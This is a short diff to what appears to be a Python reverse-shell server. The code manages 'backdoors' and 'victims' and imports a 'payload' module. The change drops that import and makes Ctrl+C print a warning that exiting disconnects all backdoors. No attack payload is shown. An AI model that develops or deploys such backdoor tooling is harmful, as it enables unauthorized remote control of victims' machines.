@@ -11,7 +11,6 @@ import aiochannel
 import subprocess
 import aioconsole
 import ipaddress
-import payload
 from typing import Optional
 import base64  
 SERVER_HOST = "0.0.0.0"
@@ -152,7 +151,9 @@ class ReverseShellManager:
         await self.backdoors[remote][1].wait_closed()
 
 def signal_handler(sig, frame):
-    exit(0)
+    print("\nDisallowed to exit with Ctrl+C, use the exit command\n")
+    print(colored("DANGER: IF YOU EXIT THE SERVER, ALL BACKDOORS WILL BE DISCONNECTED", 'red'))
+    print("> ", end='')
     
 def list_victims(conn, victims):
     # Get the victims
